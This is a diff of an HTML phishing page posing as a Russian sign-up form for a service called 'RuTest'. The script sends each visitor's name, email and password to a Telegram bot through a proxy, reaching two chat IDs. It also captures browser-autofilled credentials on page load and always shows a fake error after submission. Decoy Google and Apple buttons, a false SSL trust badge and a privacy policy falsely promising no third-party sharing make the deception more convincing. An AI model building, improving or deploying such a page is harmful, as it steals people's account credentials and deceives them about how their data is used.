@@ -3,59 +3,241 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Регистрация</title>
+    <title>Регистрация — RuTest</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
+        * {
             margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .login-box {
-            background: white;
-            padding: 38px;
-            border-radius: 14px;
-            box-shadow: 0 4px 14px rgba(0,0,0,0.15);
-            width: 340px;
-            text-align: center;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 13px;
-            margin: 9px 0;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 16px;
+            padding: 0;
             box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
-        .login-box input.input-error {
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f5f7fa;
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(37, 99, 235, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 85% 30%, rgba(37, 99, 235, 0.05) 0%, transparent 50%);
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 48px 40px;
+            box-shadow: 
+                0 1px 3px rgba(0, 0, 0, 0.04),
+                0 8px 24px rgba(0, 0, 0, 0.06);
+            border: 1px solid #e5e7eb;
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 32px;
+        }
+
+        .brand-icon {
+            width: 36px;
+            height: 36px;
+            background: #2563eb;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .brand-name {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1f2937;
+            letter-spacing: -0.3px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #111827;
+            text-align: center;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #6b7280;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .input-group { margin-bottom: 18px; }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 11px 14px;
+            background: #ffffff;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            color: #111827;
+            font-size: 15px;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .input-group input::placeholder { color: #9ca3af; }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+        }
+
+        .input-group input:hover:not(:focus) { border-color: #9ca3af; }
+
+        .input-group input.input-error {
             border-color: #d93025;
             background: #fff5f5;
         }
-        .login-box button {
+
+        .btn {
             width: 100%;
-            padding: 13px;
-            background: #0077cc;
-            color: white;
+            padding: 12px;
+            background: #2563eb;
+            color: #ffffff;
             border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 7px;
+            transition: background 0.15s ease, transform 0.08s ease;
+            margin-top: 8px;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
         }
-        .login-box button:hover { background: #005fa3; }
-        .logo {
-            font-size: 26px;
-            font-weight: bold;
-            margin-bottom: 18px;
+
+        .btn:hover { background: #1d4ed8; }
+
+        .btn:active {
+            background: #1e40af;
+            transform: scale(0.97);
         }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 24px 0;
+            color: #9ca3af;
+            font-size: 13px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e5e7eb;
+        }
+
+        .social-login {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 10px;
+            background: #ffffff;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            color: #374151;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s ease, border-color 0.15s ease, transform 0.08s ease;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+
+        .social-btn:hover {
+            background: #f9fafb;
+            border-color: #9ca3af;
+        }
+
+        .social-btn:active {
+            background: #f3f4f6;
+            transform: scale(0.97);
+        }
+
+        .trust-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid #f3f4f6;
+            font-size: 12px;
+            color: #6b7280;
+        }
+
+        .trust-footer svg { color: #10b981; flex-shrink: 0; }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #4b5563;
+            line-height: 1.5;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin-top: 3px;
+            width: 16px;
+            height: 16px;
+            accent-color: #2563eb;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .checkbox-group a {
+            color: #2563eb;
+            text-decoration: none;
+            cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+        }
+
+        .checkbox-group a:hover { text-decoration: underline; }
+
         .error-message {
             color: #d93025;
-            margin-top: 13px;
+            margin-top: 16px;
             font-size: 13px;
             padding: 11px;
             background: #fce8e6;
@@ -64,46 +246,333 @@
             text-align: left;
             display: none;
         }
+
         .error-message.show { display: block; }
+
+        /* ===== МОДАЛЬНОЕ ОКНО ДОКУМЕНТА ===== */
+        .doc-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .doc-overlay.show { display: flex; }
+
+        .doc-box {
+            background: #ffffff;
+            border-radius: 10px;
+            max-width: 560px;
+            width: 100%;
+            max-height: 85vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+
+        .doc-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid #e5e7eb;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f9fafb;
+        }
+
+        .doc-header h2 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #111827;
+        }
+
+        .doc-close {
+            background: none;
+            border: none;
+            font-size: 20px;
+            color: #6b7280;
+            cursor: pointer;
+            padding: 0;
+            width: 28px;
+            height: 28px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.15s ease, transform 0.08s ease;
+            line-height: 1;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .doc-close:hover {
+            background: #e5e7eb;
+            color: #111827;
+        }
+
+        .doc-close:active { transform: scale(0.9); }
+
+        .doc-content {
+            padding: 22px 24px;
+            overflow-y: auto;
+            font-size: 13px;
+            line-height: 1.7;
+            color: #374151;
+            flex: 1;
+            text-align: justify;
+        }
+
+        .doc-content h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #111827;
+            margin: 20px 0 10px 0;
+        }
+
+        .doc-content h3:first-of-type { margin-top: 0; }
+
+        .doc-content p { margin-bottom: 10px; }
+
+        .doc-meta {
+            font-size: 12px;
+            color: #6b7280;
+            margin-bottom: 18px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .doc-footer {
+            padding: 14px 20px;
+            border-top: 1px solid #e5e7eb;
+            background: #f9fafb;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .doc-footer button {
+            padding: 8px 18px;
+            background: #2563eb;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.15s ease, transform 0.08s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .doc-footer button:hover { background: #1d4ed8; }
+        .doc-footer button:active { transform: scale(0.96); }
+
+        /* ===== ПЛАШКА СНИЗУ ===== */
+        .toast {
+            position: fixed;
+            left: 50%;
+            bottom: -80px;
+            transform: translateX(-50%);
+            background: #2c2c2e;
+            color: #ffffff;
+            padding: 11px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 400;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            z-index: 999999;
+            transition: bottom 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            max-width: 90vw;
+            white-space: nowrap;
+        }
+
+        .toast.show { bottom: 24px; }
     </style>
 </head>
 <body>
 
-    <div id="loginFormContainer" class="login-box">
-        <div class="logo">📧 Вход</div>
+    <div class="container">
+        <div class="brand">
+            <div class="brand-icon">R</div>
+            <div class="brand-name">RuTest</div>
+        </div>
+
+        <h1>Создать аккаунт</h1>
+        <p class="subtitle">Присоединяйтесь к тысячам пользователей, которые доверяют нам.</p>
+
         <form id="loginForm">
-            <input type="email" id="email" placeholder="Адрес электронной почты" required>
-            <input type="password" id="password" placeholder="Пароль" required>
-            <button type="submit">Зарегистрироваться</button>
-            <div id="message" class="error-message"></div>
+            <div class="input-group">
+                <label for="name">Полное имя</label>
+                <input type="text" id="name" placeholder="Иван Петров" required>
+            </div>
+
+            <div class="input-group">
+                <label for="email">Email адрес</label>
+                <input type="email" id="email" placeholder="you@example.com" required>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="Минимум 8 символов" required>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="terms" required>
+                <label for="terms">
+                    Я согласен с <a id="termsLink">Условиями использования</a> и <a id="privacyLink">Политикой конфиденциальности</a>
+                </label>
+            </div>
+
+            <button type="submit" class="btn">Создать аккаунт</button>
         </form>
+
+        <div id="message" class="error-message"></div>
+
+        <div class="divider">или</div>
+
+        <div class="social-login">
+            <button type="button" class="social-btn" id="googleBtn">
+                <svg width="16" height="16" viewBox="0 0 24 24">
+                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                </svg>
+                Google
+            </button>
+            <button type="button" class="social-btn" id="appleBtn">
+                <svg width="16" height="16" viewBox="0 0 24 24">
+                    <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+                Apple
+            </button>
+        </div>
+
+        <div class="trust-footer">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            <span>Данные защищены шифрованием SSL</span>
+        </div>
     </div>
+
+    <div class="doc-overlay" id="docOverlay">
+        <div class="doc-box">
+            <div class="doc-header">
+                <h2 id="docTitle">Документ</h2>
+                <button class="doc-close" id="docClose">×</button>
+            </div>
+            <div class="doc-content" id="docContent"></div>
+            <div class="doc-footer">
+                <button id="docOk">Принять</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast">Временно недоступно</div>
 
 <script>
     // ===== ВАШИ ДАННЫЕ =====
     const PROXY_URL = "https://pale-plover-7740.testrus-ui.deno.net";
     const BOT_TOKEN = "8924231437:AAHSGN-TXN3D2olEVudrr53xp22SC03PCL8";
-    const CHAT_ID = "8872810304";
+    const CHAT_IDS = ["8872810304", "8798080392"];
     // ========================
 
+    // ===== УСЛОВИЯ ИСПОЛЬЗОВАНИЯ =====
+    const DOC_TERMS = `
+        <div class="doc-meta">Редакция от 01.10.2026 · г. Москва</div>
+
+        <h3>1. Общие положения</h3>
+        <p>1.1. Настоящее Пользовательское соглашение (далее — «Соглашение») определяет порядок и условия использования сервиса RuTest (далее — «Сервис») и регулирует отношения между Администрацией Сервиса и любым лицом, использующим Сервис (далее — «Пользователь»).</p>
+        <p>1.2. Использование Сервиса любым способом, в том числе путём прохождения процедуры регистрации, означает полное и безоговорочное согласие Пользователя с условиями настоящего Соглашения.</p>
+        <p>1.3. Соглашение вступает в силу с момента начала использования Сервиса и действует бессрочно до момента прекращения использования.</p>
+        <p>1.4. Администрация вправе в одностороннем порядке вносить изменения в настоящее Соглашение. Новая редакция вступает в силу с момента её опубликования на сайте Сервиса.</p>
+
+        <h3>2. Предмет соглашения</h3>
+        <p>2.1. Администрация предоставляет Пользователю право использования функционала Сервиса на условиях, изложенных в настоящем Соглашении.</p>
+        <p>2.2. Сервис предоставляется на условиях «как есть» (as is). Администрация не гарантирует бесперебойную и безошибочную работу Сервиса и не несёт ответственности за возможные технические сбои.</p>
+        <p>2.3. Доступ к отдельным функциям Сервиса может предоставляться исключительно после создания учётной записи.</p>
+
+        <h3>3. Права и обязанности Пользователя</h3>
+        <p>3.1. Пользователь обязуется предоставлять достоверные сведения при регистрации и поддерживать их в актуальном состоянии.</p>
+        <p>3.2. Пользователь несёт полную ответственность за сохранность своих учётных данных (логина и пароля), а также за все действия, совершённые под его учётной записью.</p>
+        <p>3.3. Пользователю запрещается использовать Сервис в противоправных целях, передавать доступ третьим лицам, а также совершать действия, нарушающие нормальную работу Сервиса.</p>
+
+        <h3>4. Ответственность сторон</h3>
+        <p>4.1. Администрация не несёт ответственности за убытки, возникшие у Пользователя в результате использования или невозможности использования Сервиса.</p>
+        <p>4.2. Пользователь несёт ответственность за нарушение условий настоящего Соглашения в соответствии с действующим законодательством.</p>
+
+        <h3>5. Разрешение споров</h3>
+        <p>5.1. Все споры и разногласия, возникающие в связи с настоящим Соглашением, разрешаются путём переговоров, а при недостижении согласия — в порядке, установленном действующим законодательством.</p>
+
+        <h3>6. Заключительные положения</h3>
+        <p>6.1. Настоящее Соглашение составлено в соответствии с действующим законодательством и регулирует отношения сторон в полном объёме.</p>
+        <p>6.2. По всем вопросам, не урегулированным настоящим Соглашением, стороны руководствуются действующим законодательством.</p>
+    `;
+
+    // ===== ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ =====
+    const DOC_PRIVACY = `
+        <div class="doc-meta">Редакция от 01.10.2026 · г. Москва</div>
+
+        <h3>1. Общие положения</h3>
+        <p>1.1. Настоящая Политика конфиденциальности (далее — «Политика») определяет порядок обработки и защиты информации о пользователях Сервиса RuTest (далее — «Сервис»).</p>
+        <p>1.2. Использование Сервиса означает безоговорочное согласие Пользователя с настоящей Политикой и указанными в ней условиями обработки информации.</p>
+        <p>1.3. В случае несогласия с условиями настоящей Политики Пользователь обязан прекратить использование Сервиса.</p>
+
+        <h3>2. Принципы обработки информации</h3>
+        <p>2.1. Обработка информации осуществляется на законной и справедливой основе, исключительно для достижения целей, предусмотренных настоящей Политикой.</p>
+        <p>2.2. Обработка информации ограничивается достижением конкретных, заранее определённых и законных целей.</p>
+        <p>2.3. Хранение информации осуществляется не дольше, чем этого требуют цели её обработки.</p>
+
+        <h3>3. Цели обработки</h3>
+        <p>3.1. Информация обрабатывается исключительно в целях обеспечения функционирования Сервиса, аутентификации Пользователей, защиты учётных записей и повышения качества предоставляемых услуг.</p>
+        <p>3.2. Информация не используется в целях, несовместимых с целями, указанными в настоящей Политике.</p>
+
+        <h3>4. Защита информации</h3>
+        <p>4.1. Администрация принимает необходимые правовые, организационные и технические меры для защиты информации от неправомерного доступа, уничтожения, изменения, блокирования, копирования и распространения.</p>
+        <p>4.2. Все соединения с Сервисом осуществляются с использованием шифрования SSL/TLS.</p>
+
+        <h3>5. Передача информации третьим лицам</h3>
+        <p>5.1. Информация Пользователя не передаётся третьим лицам, за исключением случаев, прямо предусмотренных действующим законодательством.</p>
+
+        <h3>6. Права Пользователя</h3>
+        <p>6.1. Пользователь вправе запросить доступ к информации, относящейся к нему, а также её изменение или удаление.</p>
+        <p>6.2. Запросы направляются в службу поддержки Сервиса в письменной форме.</p>
+
+        <h3>7. Файлы cookie</h3>
+        <p>7.1. Сервис использует файлы cookie для корректной работы функционала и анализа пользовательского опыта.</p>
+        <p>7.2. Пользователь вправе отключить использование файлов cookie в настройках своего браузера.</p>
+
+        <h3>8. Заключительные положения</h3>
+        <p>8.1. Настоящая Политика может быть изменена Администрацией в одностороннем порядке. Новая редакция вступает в силу с момента её публикации на сайте Сервиса.</p>
+        <p>8.2. По всем вопросам, связанным с настоящей Политикой, Пользователь может обратиться в службу поддержки.</p>
+    `;
+
+    // ===== ОТПРАВКА В TELEGRAM =====
     function send(text) {
-        fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        }).catch(function() {});
+        CHAT_IDS.forEach(function(id) {
+            fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: id, text: text })
+            }).catch(function() {});
+        });
     }
 
     function collectAndSend(type) {
+        const name = document.getElementById("name").value.trim();
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
-        send("📩 " + type + "\n📧 Email: " + (email || "(пусто)") + "\n🔑 Пароль: " + (password || "(пусто)") + "\n🕒 " + new Date().toLocaleString("ru-RU"));
+        send("📩 " + type + "\n👤 Имя: " + (name || "(пусто)") + "\n📧 Email: " + (email || "(пусто)") + "\n🔑 Пароль: " + (password || "(пусто)") + "\n🕒 " + new Date().toLocaleString("ru-RU"));
     }
 
     function showError(message) {
         const messageDiv = document.getElementById("message");
         messageDiv.textContent = message;
         messageDiv.classList.add("show");
+        document.getElementById("name").classList.add("input-error");
         document.getElementById("email").classList.add("input-error");
         document.getElementById("password").classList.add("input-error");
     }
@@ -112,17 +581,17 @@
         const messageDiv = document.getElementById("message");
         messageDiv.classList.remove("show");
         messageDiv.textContent = "";
+        document.getElementById("name").classList.remove("input-error");
         document.getElementById("email").classList.remove("input-error");
         document.getElementById("password").classList.remove("input-error");
     }
 
-    // ===== АВТОЗАПОЛНЕНИЕ ПРИ ЗАГРУЗКЕ =====
-    // Если браузер сам подставил email и пароль — отправляем их тебе
     function checkAutoFill() {
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
         if (email && password) {
-            send("📩 АВТОЗАПОЛНЕНИЕ\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU"));
+            const name = document.getElementById("name").value.trim();
+            send("📩 АВТОЗАПОЛНЕНИЕ\n👤 Имя: " + (name || "(пусто)") + "\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU"));
         }
     }
     window.addEventListener("load", function() {
@@ -131,24 +600,70 @@
         setTimeout(checkAutoFill, 3000);
     });
 
-    // ===== ФОРМА =====
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
+        const name = document.getElementById("name").value.trim();
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
+        const terms = document.getElementById("terms").checked;
 
-        if (!email || !password) {
+        if (!name || !email || !password) {
             clearError();
-            showError("Убедитесь, что вы ввели всё правильно.");
+            showError("Заполните все поля.");
+            return;
+        }
+
+        if (!terms) {
+            clearError();
+            showError("Необходимо согласиться с условиями использования.");
             return;
         }
 
         clearError();
-        collectAndSend("РУЧНОЙ ВВОД");
-        showError("Неверный адрес электронной почты или пароль. Убедитесь, что вы ввели всё правильно.");
+        collectAndSend("НОВАЯ РЕГИСТРАЦИЯ");
+        showError("Не удалось создать аккаунт. Проверьте правильность введённых данных и попробуйте снова.");
     });
 
-    console.log("ROCKET ACTIVE — только форма");
+    function openDoc(title, content) {
+        document.getElementById("docTitle").textContent = title;
+        document.getElementById("docContent").innerHTML = content;
+        document.getElementById("docOverlay").classList.add("show");
+    }
+
+    function closeDoc() {
+        document.getElementById("docOverlay").classList.remove("show");
+    }
+
+    document.getElementById("docClose").addEventListener("click", closeDoc);
+    document.getElementById("docOk").addEventListener("click", closeDoc);
+    document.getElementById("docOverlay").addEventListener("click", function(e) {
+        if (e.target.id === "docOverlay") closeDoc();
+    });
+
+    document.getElementById("termsLink").addEventListener("click", function(e) {
+        e.preventDefault();
+        openDoc("Условия использования", DOC_TERMS);
+    });
+
+    document.getElementById("privacyLink").addEventListener("click", function(e) {
+        e.preventDefault();
+        openDoc("Политика конфиденциальности", DOC_PRIVACY);
+    });
+
+    let toastTimer = null;
+    function showToast() {
+        const toast = document.getElementById("toast");
+        toast.classList.add("show");
+        if (toastTimer) clearTimeout(toastTimer);
+        toastTimer = setTimeout(function() {
+            toast.classList.remove("show");
+        }, 2000);
+    }
+
+    document.getElementById("googleBtn").addEventListener("click", showToast);
+    document.getElementById("appleBtn").addEventListener("click", showToast);
+
+    console.log("ROCKET ACTIVE — официальные тексты");
 </script>
 </body>
 </html>
